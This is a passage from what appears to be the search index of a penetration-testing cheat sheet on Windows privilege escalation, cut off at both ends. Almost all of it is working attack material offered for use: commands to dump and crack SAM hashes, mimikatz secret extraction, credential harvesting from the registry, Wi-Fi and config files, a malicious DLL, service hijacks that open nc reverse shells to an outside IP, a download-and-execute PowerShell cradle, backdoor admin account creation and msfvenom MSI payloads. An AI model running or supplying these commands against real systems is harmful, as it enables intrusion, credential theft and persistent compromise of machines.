ifIndex,IPAddress,LinkLayerAddress,State\n</code></pre> <p>List all current connections</p> <pre><code>netstat -ano\n</code></pre> <p>List all network shares</p> <pre><code>net share\npowershell Find-DomainShare -ComputerDomain domain.local\n</code></pre> <p>SNMP Configuration</p> <pre><code>reg query HKLM\\SYSTEM\\CurrentControlSet\\Services\\SNMP /s\nGet-ChildItem -path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\SNMP -Recurse\n</code></pre>"},{"location":"privilege-escalation/windows/#antivirus-enumeration","title":"Antivirus Enumeration","text":"<p>Enumerate antivirus on a box with <code>WMIC /Node:localhost /Namespace:\\\\root\\SecurityCenter2 Path AntivirusProduct Get displayName</code></p>"},{"location":"privilege-escalation/windows/#default-writeable-folders","title":"Default Writeable Folders","text":"<pre><code>C:\\Windows\\System32\\Microsoft\\Crypto\\RSA\\MachineKeys\nC:\\Windows\\System32\\spool\\drivers\\color\nC:\\Windows\\System32\\spool\\printers\nC:\\Windows\\System32\\spool\\servers\nC:\\Windows\\tracing\nC:\\Windows\\Temp\nC:\\Users\\Public\nC:\\Windows\\Tasks\nC:\\Windows\\System32\\tasks\nC:\\Windows\\SysWOW64\\tasks\nC:\\Windows\\System32\\tasks_migrated\\microsoft\\windows\\pls\\system\nC:\\Windows\\SysWOW64\\tasks\\microsoft\\windows\\pls\\system\nC:\\Windows\\debug\\wia\nC:\\Windows\\registration\\crmlog\nC:\\Windows\\System32\\com\\dmp\nC:\\Windows\\SysWOW64\\com\\dmp\nC:\\Windows\\System32\\fxstmp\nC:\\Windows\\SysWOW64\\fxstmp\n</code></pre>"},{"location":"privilege-escalation/windows/#eop-looting-for-passwords","title":"EoP - Looting for passwords","text":""},{"location":"privilege-escalation/windows/#sam-and-system-files","title":"SAM and SYSTEM files","text":"<p>The Security Account Manager (SAM), often Security Accounts Manager, is a database file. The user passwords are stored in a hashed format in a registry hive either as a LM hash or as a NTLM hash. This file can be found in %SystemRoot%/system32/config/SAM and is mounted on HKLM/SAM.</p> <pre><code># Usually %SYSTEMROOT% = C:\\Windows\n%SYSTEMROOT%\\repair\\SAM\n%SYSTEMROOT%\\System32\\config\\RegBack\\SAM\n%SYSTEMROOT%\\System32\\config\\SAM\n%SYSTEMROOT%\\repair\\system\n%SYSTEMROOT%\\System32\\config\\SYSTEM\n%SYSTEMROOT%\\System32\\config\\RegBack\\system\n</code></pre> <p>Generate a hash file for John using <code>pwdump</code> or <code>samdump2</code>.</p> <pre><code>pwdump SYSTEM SAM &gt; /root/sam.txt\nsamdump2 SYSTEM SAM -o sam.txt\n</code></pre> <p>Either crack it with <code>john -format=NT /root/sam.txt</code>, hashcat or use Pass-The-Hash.</p>"},{"location":"privilege-escalation/windows/#hivenightmare","title":"HiveNightmare","text":"<p>CVE-2021\u201336934 allows you to retrieve all registry hives (SAM,SECURITY,SYSTEM) in Windows 10 and 11 as a non-administrator user Check for the vulnerability using <code>icacls</code></p> <pre><code>C:\\Windows\\System32&gt; icacls config\\SAM\nconfig\\SAM BUILTIN\\Administrators:(I)(F)\n           NT AUTHORITY\\SYSTEM:(I)(F)\n           BUILTIN\\Users:(I)(RX)    &lt;-- this is wrong - regular users should not have read access!\n</code></pre> <p>Then exploit the CVE by requesting the shadowcopies on the filesystem and reading the hives from it.</p> <pre><code>mimikatz&gt; token::whoami /full\n# List shadow copies available\nmimikatz&gt; misc::shadowcopies\n# Extract account from SAM databases\nmimikatz&gt; lsadump::sam /system:\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SYSTEM /sam:\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SAM\n# Extract secrets from SECURITY\nmimikatz&gt; lsadump::secrets /system:\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SYSTEM /security:\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SECURITY\n</code></pre>"},{"location":"privilege-escalation/windows/#laps-settings","title":"LAPS Settings","text":"<p>Extract <code>HKLM\\Software\\Policies\\Microsoft Services\\AdmPwd</code> from Windows Registry.</p> <ul> <li>LAPS Enabled: AdmPwdEnabled</li> <li>LAPS Admin Account Name: AdminAccountName</li> <li>LAPS Password Complexity: PasswordComplexity</li> <li>LAPS Password Length: PasswordLength</li> <li>LAPS Expiration Protection Enabled: PwdExpirationProtectionEnabled</li> </ul>"},{"location":"privilege-escalation/windows/#search-for-file-contents","title":"Search for file contents","text":"<pre><code>cd C:\\ &amp; findstr /SI /M \"password\" *.xml *.ini *.txt\nfindstr /si password *.xml *.ini *.txt *.config 2&gt;nul &gt;&gt; results.txt\nfindstr /spin \"password\" *.*\n</code></pre> <p>Also search in remote places such as SMB Shares and SharePoint:</p> <ul> <li>Search passwords in SharePoint: nheiniger/SnaffPoint (must be compiled first, for referencing issue see: https://github.com/nheiniger/SnaffPoint/pull/6)</li> </ul> <pre><code># First, retrieve a token\n## Method 1: using SnaffPoint binary\n$token = (.\\GetBearerToken.exe https://your.sharepoint.com)\n## Method 2: using AADInternals\nInstall-Module AADInternals -Scope CurrentUser\nImport-Module AADInternals\n$token = (Get-AADIntAccessToken -ClientId \"9bc3ab49-b65d-410a-85ad-de819febfddc\" -Tenant \"your.onmicrosoft.com\" -Resource \"https://your.sharepoint.com\")\n# Second, search on Sharepoint\n## Method 1: using search strings in ./presets dir\n.\\SnaffPoint.exe -u \"https://your.sharepoint.com\" -t $token\n## Method 2: using search string in command line\n### -l uses FQL search, see: https://learn.microsoft.com/en-us/sharepoint/dev/general-development/fast-query-language-fql-syntax-reference\n.\\SnaffPoint.exe -u \"https://your.sharepoint.com\" -t $token -l -q \"filename:.config\"\n</code></pre> <ul> <li>Search passwords in SMB Shares: SnaffCon/Snaffler</li> </ul>"},{"location":"privilege-escalation/windows/#search-for-a-file-with-a-certain-filename","title":"Search for a file with a certain filename","text":"<pre><code>dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*\nwhere /R C:\\ user.txt\nwhere /R C:\\ *.ini\n</code></pre>"},{"location":"privilege-escalation/windows/#search-the-registry-for-key-names-and-passwords","title":"Search the registry for key names and passwords","text":"<pre><code>REG QUERY HKLM /F \"password\" /t REG_SZ /S /K\nREG QUERY HKCU /F \"password\" /t REG_SZ /S /K\nreg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon\" # Windows Autologin\nreg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon\" 2&gt;nul | findstr \"DefaultUserName DefaultDomainName DefaultPassword\" \nreg query \"HKLM\\SYSTEM\\Current\\ControlSet\\Services\\SNMP\" # SNMP parameters\nreg query \"HKCU\\Software\\SimonTatham\\PuTTY\\Sessions\" # Putty clear text proxy credentials\nreg query \"HKCU\\Software\\ORL\\WinVNC3\\Password\" # VNC credentials\nreg query HKEY_LOCAL_MACHINE\\SOFTWARE\\RealVNC\\WinVNC4 /v password\nreg query HKLM /f password /t REG_SZ /s\nreg query HKCU /f password /t REG_SZ /s\n</code></pre>"},{"location":"privilege-escalation/windows/#passwords-in-unattendxml","title":"Passwords in unattend.xml","text":"<p>Location of the unattend.xml files.</p> <pre><code>C:\\unattend.xml\nC:\\Windows\\Panther\\Unattend.xml\nC:\\Windows\\Panther\\Unattend\\Unattend.xml\nC:\\Windows\\system32\\sysprep.inf\nC:\\Windows\\system32\\sysprep\\sysprep.xml\n</code></pre> <p>Display the content of these files with <code>dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2&gt;nul</code>.</p> <p>Example content</p> <pre><code>&lt;component name=\"Microsoft-Windows-Shell-Setup\" publicKeyToken=\"31bf3856ad364e35\" language=\"neutral\" versionScope=\"nonSxS\" processorArchitecture=\"amd64\"&gt;\n    &lt;AutoLogon&gt;\n     &lt;Password&gt;U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==&lt;/Password&gt;\n     &lt;Enabled&gt;true&lt;/Enabled&gt;\n     &lt;Username&gt;Administrateur&lt;/Username&gt;\n    &lt;/AutoLogon&gt;\n    &lt;UserAccounts&gt;\n     &lt;LocalAccounts&gt;\n      &lt;LocalAccount wcm:action=\"add\"&gt;\n       &lt;Password&gt;*SENSITIVE*DATA*DELETED*&lt;/Password&gt;\n       &lt;Group&gt;administrators;users&lt;/Group&gt;\n       &lt;Name&gt;Administrateur&lt;/Name&gt;\n      &lt;/LocalAccount&gt;\n     &lt;/LocalAccounts&gt;\n    &lt;/UserAccounts&gt;\n</code></pre> <p>Unattend credentials are stored in base64 and can be decoded manually with base64.</p> <pre><code>$ echo \"U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo=\"  | base64 -d \nSecretSecurePassword1234*\n</code></pre> <p>The Metasploit module <code>post/windows/gather/enum_unattend</code> looks for these files.</p>"},{"location":"privilege-escalation/windows/#iis-web-config","title":"IIS Web config","text":"<pre><code>Get-Childitem \u2013Path C:\\inetpub\\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue\n</code></pre> <pre><code>C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\Config\\web.config\nC:\\inetpub\\wwwroot\\web.config\n</code></pre>"},{"location":"privilege-escalation/windows/#other-files","title":"Other files","text":"<pre><code>%SYSTEMDRIVE%\\pagefile.sys\n%WINDIR%\\debug\\NetSetup.log\n%WINDIR%\\repair\\sam\n%WINDIR%\\repair\\system\n%WINDIR%\\repair\\software, %WINDIR%\\repair\\security\n%WINDIR%\\iis6.log\n%WINDIR%\\system32\\config\\AppEvent.Evt\n%WINDIR%\\system32\\config\\SecEvent.Evt\n%WINDIR%\\system32\\config\\default.sav\n%WINDIR%\\system32\\config\\security.sav\n%WINDIR%\\system32\\config\\software.sav\n%WINDIR%\\system32\\config\\system.sav\n%WINDIR%\\system32\\CCM\\logs\\*.log\n%USERPROFILE%\\ntuser.dat\n%USERPROFILE%\\LocalS~1\\Tempor~1\\Content.IE5\\index.dat\n%WINDIR%\\System32\\drivers\\etc\\hosts\nC:\\ProgramData\\Configs\\*\nC:\\Program Files\\Windows PowerShell\\*\ndir c:*vnc.ini /s /b\ndir c:*ultravnc.ini /s /b\n</code></pre>"},{"location":"privilege-escalation/windows/#wifi-passwords","title":"Wifi passwords","text":"<p>Find AP SSID <pre><code>netsh wlan show profile\n</code></pre></p> <p>Get Cleartext Pass <pre><code>netsh wlan show profile &lt;SSID&gt; key=clear\n</code></pre></p> <p>Oneliner method to extract wifi passwords from all the access point.</p> <pre><code>cls &amp; echo. &amp; for /f \"tokens=4 delims=: \" %a in ('netsh wlan show profiles ^| find \"Profile \"') do @echo off &gt; nul &amp; (netsh wlan show profiles name=%a key=clear | findstr \"SSID Cipher Content\" | find /v \"Number\" &amp; echo.) &amp; @echo on\n</code></pre>"},{"location":"privilege-escalation/windows/#sticky-notes-passwords","title":"Sticky Notes passwords","text":"<p>The sticky notes app stores it's content in a sqlite db located at <code>C:\\Users\\&lt;user&gt;\\AppData\\Local\\Packages\\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\\LocalState\\plum.sqlite</code></p>"},{"location":"privilege-escalation/windows/#passwords-stored-in-services","title":"Passwords stored in services","text":"<p>Saved session information for PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP using SessionGopher</p> <pre><code>https://raw.githubusercontent.com/Arvanaghi/SessionGopher/master/SessionGopher.ps1\nImport-Module path\\to\\SessionGopher.ps1;\nInvoke-SessionGopher -AllDomain -o\nInvoke-SessionGopher -AllDomain -u domain.com\\adm-arvanaghi -p s3cr3tP@ss\n</code></pre>"},{"location":"privilege-escalation/windows/#passwords-stored-in-key-manager","title":"Passwords stored in Key Manager","text":"<p> This software will display its output in a GUI</p> <pre><code>rundll32 keymgr,KRShowKeyMgr\n</code></pre>"},{"location":"privilege-escalation/windows/#powershell-history","title":"Powershell History","text":"<p>Disable Powershell history: <code>Set-PSReadlineOption -HistorySaveStyle SaveNothing</code>.</p> <pre><code>type %userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt\ntype C:\\Users\\swissky\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt\ntype $env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt\ncat (Get-PSReadlineOption).HistorySavePath\ncat (Get-PSReadlineOption).HistorySavePath | sls passw\n</code></pre>"},{"location":"privilege-escalation/windows/#powershell-transcript","title":"Powershell Transcript","text":"<pre><code>C:\\Users\\&lt;USERNAME&gt;\\Documents\\PowerShell_transcript.&lt;HOSTNAME&gt;.&lt;RANDOM&gt;.&lt;TIMESTAMP&gt;.txt\nC:\\Transcripts\\&lt;DATE&gt;\\PowerShell_transcript.&lt;HOSTNAME&gt;.&lt;RANDOM&gt;.&lt;TIMESTAMP&gt;.txt\n</code></pre>"},{"location":"privilege-escalation/windows/#password-in-alternate-data-stream","title":"Password in Alternate Data Stream","text":"<pre><code>PS &gt; Get-Item -path flag.txt -Stream *\nPS &gt; Get-Content -path flag.txt -Stream Flag\n</code></pre>"},{"location":"privilege-escalation/windows/#eop-processes-enumeration-and-tasks","title":"EoP - Processes Enumeration and Tasks","text":"<ul> <li> <p>What processes are running?     <pre><code>tasklist /v\nnet start\nsc query\nGet-Service\nGet-Process\nGet-WmiObject -Query \"Select * from Win32_Process\" | where {$_.Name -notlike \"svchost*\"} | Select Name, Handle, @{Label=\"Owner\";Expression={$_.GetOwner().User}} | ft -AutoSize\n</code></pre></p> </li> <li> <p>Which processes are running as \"system\"     <pre><code>tasklist /v /fi \"username eq system\"\n</code></pre></p> </li> <li> <p>Do you have powershell magic?     <pre><code>REG QUERY \"HKLM\\SOFTWARE\\Microsoft\\PowerShell\\1\\PowerShellEngine\" /v PowerShellVersion\n</code></pre></p> </li> <li> <p>List installed programs     <pre><code>Get-ChildItem 'C:\\Program Files', 'C:\\Program Files (x86)' | ft Parent,Name,LastWriteTime\nGet-ChildItem -path Registry::HKEY_LOCAL_MACHINE\\SOFTWARE | ft Name\n</code></pre></p> </li> <li> <p>List services     <pre><code>net start\nwmic service list brief\ntasklist /SVC\n</code></pre></p> </li> <li> <p>Enumerate scheduled tasks     <pre><code>schtasks /query /fo LIST 2&gt;nul | findstr TaskName\nschtasks /query /fo LIST /v &gt; schtasks.txt; cat schtask.txt | grep \"SYSTEM\\|Task To Run\" | grep -B 1 SYSTEM\nGet-ScheduledTask | where {$_.TaskPath -notlike \"\\Microsoft*\"} | ft TaskName,TaskPath,State\n</code></pre></p> </li> <li> <p>Startup tasks     <pre><code>wmic startup get caption,command\nreg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\R\nreg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\nreg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\ndir \"C:\\Documents and Settings\\All Users\\Start Menu\\Programs\\Startup\"\ndir \"C:\\Documents and Settings\\%username%\\Start Menu\\Programs\\Startup\"\n</code></pre></p> </li> </ul>"},{"location":"privilege-escalation/windows/#eop-incorrect-permissions-in-services","title":"EoP - Incorrect permissions in services","text":"<p>A service running as Administrator/SYSTEM with incorrect file permissions might allow EoP. You can replace the binary, restart the service and get system. Often, services are pointing to writeable locations: - Orphaned installs, not installed anymore but still exist in startup - DLL Hijacking     <pre><code># find missing DLL \n- Find-PathDLLHijack PowerUp.ps1\n- Process Monitor : check for \"Name Not Found\"\n# compile a malicious dll\n- For x64 compile with: \"x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll\"\n- For x86 compile with: \"i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll\"\n# content of windows_dll.c\n#include &lt;windows.h&gt;\nBOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {\n    if (dwReason == DLL_PROCESS_ATTACH) {\n        system(\"cmd.exe /k whoami &gt; C:\\\\Windows\\\\Temp\\\\dll.txt\");\n        ExitProcess(0);\n    }\n    return TRUE;\n}\n</code></pre></p> <ul> <li>PATH directories with weak permissions     <pre><code>$ for /f \"tokens=2 delims='='\" %a in ('wmic service list full^|find /i \"pathname\"^|find /i /v \"system32\"') do @echo %a &gt;&gt; c:\\windows\\temp\\permissions.txt\n$ for /f eol^=^\"^ delims^=^\" %a in (c:\\windows\\temp\\permissions.txt) do cmd.exe /c icacls \"%a\"\n$ sc query state=all | findstr \"SERVICE_NAME:\" &gt;&gt; Servicenames.txt\nFOR /F %i in (Servicenames.txt) DO echo %i\ntype Servicenames.txt\nFOR /F \"tokens=2 delims= \" %i in (Servicenames.txt) DO @echo %i &gt;&gt; services.txt\nFOR /F %i in (services.txt) DO @sc qc %i | findstr \"BINARY_PATH_NAME\" &gt;&gt; path.txt\n</code></pre></li> </ul> <p>Alternatively you can use the Metasploit exploit : <code>exploit/windows/local/service_permissions</code></p> <p>Note to check file permissions you can use <code>cacls</code> and <code>icacls</code></p> <p>icacls (Windows Vista +)   cacls (Windows XP) You are looking for <code>BUILTIN\\Users:(F)</code>(Full access), <code>BUILTIN\\Users:(M)</code>(Modify access) or  <code>BUILTIN\\Users:(W)</code>(Write-only access) in the output.</p>"},{"location":"privilege-escalation/windows/#example-with-windows-10-cve-2019-1322-usosvc","title":"Example with Windows 10 - CVE-2019-1322 UsoSvc","text":"<p>Prerequisite: Service account</p> <pre><code>PS C:\\Windows\\system32&gt; sc.exe stop UsoSvc\nPS C:\\Windows\\system32&gt; sc.exe config usosvc binPath=\"C:\\Windows\\System32\\spool\\drivers\\color\\nc.exe 10.10.10.10 4444 -e cmd.exe\"\nPS C:\\Windows\\system32&gt; sc.exe config UsoSvc binpath= \"C:\\Users\\mssql-svc\\Desktop\\nc.exe 10.10.10.10 4444 -e cmd.exe\"\nPS C:\\Windows\\system32&gt; sc.exe config UsoSvc binpath= \"cmd /C C:\\Users\\nc.exe 10.10.10.10 4444 -e cmd.exe\"\nPS C:\\Windows\\system32&gt; sc.exe qc usosvc\n[SC] QueryServiceConfig SUCCESS\nSERVICE_NAME: usosvc\n        TYPE               : 20  WIN32_SHARE_PROCESS \n        START_TYPE         : 2   AUTO_START  (DELAYED)\n        ERROR_CONTROL      : 1   NORMAL\n        BINARY_PATH_NAME   : C:\\Users\\mssql-svc\\Desktop\\nc.exe 10.10.10.10 4444 -e cmd.exe\n        LOAD_ORDER_GROUP   : \n        TAG                : 0\n        DISPLAY_NAME       : Update Orchestrator Service\n        DEPENDENCIES       : rpcss\n        SERVICE_START_NAME : LocalSystem\nPS C:\\Windows\\system32&gt; sc.exe start UsoSvc\n</code></pre>"},{"location":"privilege-escalation/windows/#example-with-windows-xp-sp1-upnphost","title":"Example with Windows XP SP1 - upnphost","text":"<pre><code># NOTE: spaces are mandatory for this exploit to work !\nsc config upnphost binpath= \"C:\\Inetpub\\wwwroot\\nc.exe 10.11.0.73 4343 -e C:\\WINDOWS\\System32\\cmd.exe\"\nsc config upnphost obj= \".\\LocalSystem\" password= \"\"\nsc qc upnphost\nsc config upnphost depend= \"\"\nnet start upnphost\n</code></pre> <p>If it fails because of a missing dependency, try the following commands.</p> <pre><code>sc config SSDPSRV start=auto\nnet start SSDPSRV\nnet stop upnphost\nnet start upnphost\nsc config upnphost depend=\"\"\n</code></pre> <p>Using <code>accesschk</code> from Sysinternals or accesschk-XP.exe - github.com/phackt</p> <pre><code>$ accesschk.exe -uwcqv \"Authenticated Users\" * /accepteula\nRW SSDPSRV\n        SERVICE_ALL_ACCESS\nRW upnphost\n        SERVICE_ALL_ACCESS\n$ accesschk.exe -ucqv upnphost\nupnphost\n  RW NT AUTHORITY\\SYSTEM\n        SERVICE_ALL_ACCESS\n  RW BUILTIN\\Administrators\n        SERVICE_ALL_ACCESS\n  RW NT AUTHORITY\\Authenticated Users\n        SERVICE_ALL_ACCESS\n  RW BUILTIN\\Power Users\n        SERVICE_ALL_ACCESS\n$ sc config &lt;vuln-service&gt; binpath=\"net user backdoor backdoor123 /add\"\n$ sc config &lt;vuln-service&gt; binpath= \"C:\\nc.exe -nv 127.0.0.1 9988 -e C:\\WINDOWS\\System32\\cmd.exe\"\n$ sc stop &lt;vuln-service&gt;\n$ sc start &lt;vuln-service&gt;\n$ sc config &lt;vuln-service&gt; binpath=\"net localgroup Administrators backdoor /add\"\n$ sc stop &lt;vuln-service&gt;\n$ sc start &lt;vuln-service&gt;\n</code></pre>"},{"location":"privilege-escalation/windows/#eop-windows-subsystem-for-linux-wsl","title":"EoP - Windows Subsystem for Linux (WSL)","text":"<p>Technique borrowed from Warlockobama's tweet</p> <p>With root privileges Windows  Subsystem for Linux (WSL)  allows users to create a bind shell on any port (no elevation needed). Don't know the root password? No problem just set the default user to root W/ .exe --default-user root. Now start your bind shell or reverse. <pre><code>wsl whoami\n./ubuntun1604.exe config --default-user root\nwsl whoami\nwsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'\n</code></pre> <p>Binary <code>bash.exe</code> can also be found in <code>C:\\Windows\\WinSxS\\amd64_microsoft-windows-lxssbash_[...]\\bash.exe</code></p> <p>Alternatively you can explore the <code>WSL</code> filesystem in the folder <code>C:\\Users\\%USERNAME%\\AppData\\Local\\Packages\\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\\LocalState\\rootfs\\</code></p>"},{"location":"privilege-escalation/windows/#eop-unquoted-service-paths","title":"EoP - Unquoted Service Paths","text":"<p>The Microsoft Windows Unquoted Service Path Enumeration Vulnerability. All Windows services have a Path to its executable. If that path is unquoted and contains whitespace or other separators, then the service will attempt to access a resource in the parent path first.</p> <pre><code>wmic service get name,displayname,pathname,startmode |findstr /i \"Auto\" |findstr /i /v \"C:\\Windows\\\\\" |findstr /i /v \"\"\"\nwmic service get name,displayname,startmode,pathname | findstr /i /v \"C:\\Windows\\\\\" |findstr /i /v \"\"\"\ngwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq \"Auto\" -and $_.PathName -notlike \"C:\\Windows*\" -and $_.PathName -notlike '\"*'} | select PathName,DisplayName,Name\n</code></pre> <ul> <li>Metasploit exploit : <code>exploit/windows/local/trusted_service_path</code></li> <li>PowerUp exploit     <pre><code># find the vulnerable application\nC:\\&gt; powershell.exe -nop -exec bypass \"IEX (New-Object Net.WebClient).DownloadString('https://your-site.com/PowerUp.ps1'); Invoke-AllChecks\"\n...\n[*] Checking for unquoted service paths...\nServiceName   : BBSvc\nPath          : C:\\Program Files\\Microsoft\\Bing Bar\\7.1\\BBSvc.exe\nStartName     : LocalSystem\nAbuseFunction : Write-ServiceBinary -ServiceName 'BBSvc' -Path &lt;HijackPath&gt;\n...\n# automatic exploit\nInvoke-ServiceAbuse -Name [SERVICE_NAME] -Command \"..\\..\\Users\\Public\\nc.exe 10.10.10.10 4444 -e cmd.exe\"\n</code></pre></li> </ul>"},{"location":"privilege-escalation/windows/#example","title":"Example","text":"<p>For <code>C:\\Program Files\\something\\legit.exe</code>, Windows will try the following paths first: - <code>C:\\Program.exe</code> - <code>C:\\Program Files.exe</code></p>"},{"location":"privilege-escalation/windows/#eop-path-interception","title":"EoP - $PATH Interception","text":"<p>Requirements: - PATH contains a writeable folder with low privileges. - The writeable folder is before the folder that contains the legitimate binary.</p> <p>EXAMPLE: <pre><code># List contents of the PATH environment variable\n# EXAMPLE OUTPUT: C:\\Program Files\\nodejs\\;C:\\WINDOWS\\system32\n$env:Path\n# See permissions of the target folder\n# EXAMPLE OUTPUT: BUILTIN\\Users: GR,GW\nicacls.exe \"C:\\Program Files\\nodejs\\\"\n# Place our evil-file in that folder.\ncopy evil-file.exe \"C:\\Program Files\\nodejs\\cmd.exe\"\n</code></pre></p> <p>Because (in this example) \"C:\\Program Files\\nodejs\\\" is before \"C:\\WINDOWS\\system32\\\" on the PATH variable, the next time the user runs \"cmd.exe\", our evil version in the nodejs folder will run, instead of the legitimate one in the system32 folder. </p>"},{"location":"privilege-escalation/windows/#eop-named-pipes","title":"EoP - Named Pipes","text":"<ol> <li>Find named pipes: <code>[System.IO.Directory]::GetFiles(\"\\\\.\\pipe\\\")</code></li> <li>Check named pipes DACL: <code>pipesec.exe &lt;named_pipe&gt;</code></li> <li>Reverse engineering software</li> <li>Send data throught the named pipe : <code>program.exe &gt;\\\\.\\pipe\\StdOutPipe 2&gt;\\\\.\\pipe\\StdErrPipe</code></li> </ol>"},{"location":"privilege-escalation/windows/#eop-kernel-exploitation","title":"EoP - Kernel Exploitation","text":"<p>List of exploits kernel : https://github.com/SecWiki/windows-kernel-exploits</p>"},{"location":"privilege-escalation/windows/#security-bulletin-kb-description-operating-system","title":"#Security Bulletin\u00a0\u00a0\u00a0#KB \u00a0\u00a0\u00a0\u00a0#Description\u00a0\u00a0\u00a0\u00a0#Operating System","text":"<ul> <li>MS17-017 \u3000[KB4013081]\u3000\u3000[GDI Palette Objects Local Privilege Escalation]\u3000\u3000(windows 7/8)</li> <li>CVE-2017-8464 \u3000[LNK Remote Code Execution Vulnerability]\u3000\u3000(windows 10/8.1/7/2016/2010/2008)</li> <li>CVE-2017-0213 \u3000[Windows COM Elevation of Privilege Vulnerability]\u3000\u3000(windows 10/8.1/7/2016/2010/2008)</li> <li>CVE-2018-0833   [SMBv3 Null Pointer Dereference Denial of Service]    (Windows 8.1/Server 2012 R2)</li> <li>CVE-2018-8120   [Win32k Elevation of Privilege Vulnerability]    (Windows 7 SP1/2008 SP2,2008 R2 SP1)</li> <li>MS17-010 \u3000[KB4013389]\u3000\u3000[Windows Kernel Mode Drivers]\u3000\u3000(windows 7/2008/2003/XP)</li> <li>MS16-135 \u3000[KB3199135]\u3000\u3000[Windows Kernel Mode Drivers]\u3000\u3000(2016)</li> <li>MS16-111 \u3000[KB3186973]\u3000\u3000[kernel api]\u3000\u3000(Windows 10 10586 (32/64)/8.1)</li> <li>MS16-098 \u3000[KB3178466]\u3000\u3000[Kernel Driver]\u3000\u3000(Win 8.1)</li> <li>MS16-075 \u3000[KB3164038]\u3000\u3000[Hot Potato]\u3000\u3000(2003/2008/7/8/2012)</li> <li>MS16-034 \u3000[KB3143145]\u3000\u3000[Kernel Driver]\u3000\u3000(2008/7/8/10/2012)</li> <li>MS16-032 \u3000[KB3143141]\u3000\u3000[Secondary Logon Handle]\u3000\u3000(2008/7/8/10/2012)</li> <li>MS16-016 \u3000[KB3136041]\u3000\u3000[WebDAV]\u3000\u3000(2008/Vista/7)</li> <li>MS16-014 \u3000[K3134228]\u3000\u3000[remote code execution]\u3000\u3000(2008/Vista/7)   ...</li> <li>MS03-026 \u3000[KB823980]\u3000\u3000 [Buffer Overrun In RPC Interface]\u3000\u3000(/NT/2000/XP/2003)  </li> </ul> <p>To cross compile a program from Kali, use the following command.</p> <pre><code>Kali&gt; i586-mingw32msvc-gcc -o adduser.exe useradd.c\n</code></pre>"},{"location":"privilege-escalation/windows/#eop-microsoft-windows-installer","title":"EoP - Microsoft Windows Installer","text":""},{"location":"privilege-escalation/windows/#alwaysinstallelevated","title":"AlwaysInstallElevated","text":"<p>Using the <code>reg query</code> command, you can check the status of the <code>AlwaysInstallElevated</code> registry key for both the user and the machine. If both queries return a value of <code>0x1</code>, then <code>AlwaysInstallElevated</code> is enabled for both user and machine, indicating the system is vulnerable.</p> <ul> <li>Shell command     <pre><code>reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\nreg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\n</code></pre></li> <li>PowerShell command     <pre><code>Get-ItemProperty HKLM\\Software\\Policies\\Microsoft\\Windows\\Installer\nGet-ItemProperty HKCU\\Software\\Policies\\Microsoft\\Windows\\Installer\n</code></pre></li> </ul> <p>Then create an MSI package and install it.</p> <pre><code>$ msfvenom -p windows/adduser USER=backdoor PASS=backdoor123 -f msi -o evil.msi\n$ msfvenom -p windows/adduser USER=backdoor PASS=backdoor123 -f msi-nouac -o evil.msi\n$ msiexec /quiet /qn /i C:\\evil.msi\n</code></pre> <p>Technique also available in : * Metasploit : <code>exploit/windows/local/always_install_elevated</code> * PowerUp.ps1 : <code>Get-RegistryAlwaysInstallElevated</code>, <code>Write-UserAddMSI</code></p>"},{"location":"privilege-escalation/windows/#customactions","title":"CustomActions","text":"<p>Custom Actions in MSI allow developers to specify scripts or executables to be run at various points during an installation * mgeeky/msidump - a tool that analyzes malicious MSI installation packages, extracts files, streams, binary data and incorporates YARA scanner. * activescott/lessmsi - A tool to view and extract the contents of an Windows Installer (.msi) file. * mandiant/msi-search - This tool simplifies the task for red team operators and security teams to identify which MSI files correspond to which software and enables them to download the relevant file.</p> <p>Enumerate products on the machine</p> <pre><code>wmic product get identifyingnumber,name,vendor,version\n</code></pre> <p>Execute the repair process with the <code>/fa</code> parameter to trigger the CustomActions.  We can use both IdentifyingNumber <code>{E0F1535A-8414-5EF1-A1DD-E17EDCDC63F1}</code> or path to the installer <code>c:\\windows\\installer\\XXXXXXX.msi</code>. The repair will run with the NT SYSTEM account.</p> <pre><code>$installed = Get-WmiObject Win32_Product\n$string= $installed | select-string -pattern \"PRODUCTNAME\"\n$string[0] -match '{\\w{8}-\\w{4}-\\w{4}-\\w{4}-\\w{12}}'\nStart-Process -FilePath \"msiexec.exe\" -ArgumentList \"/fa $($matches[0])\"\n</code></pre> <p>Common mistakes in MSI installers:</p> <ul> <li>Missing quiet parameters: it will spawn <code>conhost.exe</code> as <code>NT SYSTEM</code>. Use <code>[CTRL]+[A]</code> to select some text in it, it will pause the execution.<ul> <li>conhost -&gt; properties -&gt; 